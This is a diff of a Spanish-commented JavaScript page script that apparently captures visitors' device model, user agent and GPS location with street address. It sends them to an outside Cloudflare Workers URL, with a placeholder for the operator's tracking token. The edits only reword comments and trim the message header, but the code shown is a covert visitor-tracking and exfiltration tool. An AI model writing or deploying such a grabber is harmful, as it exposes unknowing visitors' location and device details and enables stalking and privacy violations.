@@ -18,7 +18,7 @@
         // CONFIGURACIÓN
         // ============================================================
         const trackingId = 'AQUI_VA_TOKEN';  // 🔥 CAMBIA ESTO POR TU TOKEN REAL
-        const workerUrl = 'https://wispy-bonus-51e9.societykark.workers.dev';
+        const workerUrl = 'https://wispy-bonus-51e9.societykark.workers.dev'; // 🔥 TU WORKER
 
         console.log('✅ Script iniciado');
 
@@ -174,7 +174,7 @@
         }
 
         // ============================================================
-        // CONSTRUIR MENSAJE Y ENVIAR
+        // ENVIAR AL WORKER
         // ============================================================
         async function enviarAlWorker() {
             console.log('📤 Iniciando captura...');
@@ -198,10 +198,7 @@
                     gpsConDireccion = { ...gps, direccion };
                 }
 
-                let msg = '📊 Visitor Information Captured\n';
-                msg += '━━━━━━━━━━━━━━━━\n\n';
-
-                msg += '🖥️ Device & Browser\n';
+                let msg = '🖥️ Device & Browser\n';
                 msg += `   • Device Model: ${dispositivo.modelo}\n`;
                 msg += `   • User Agent: ${dispositivo.userAgent}\n\n`;
 
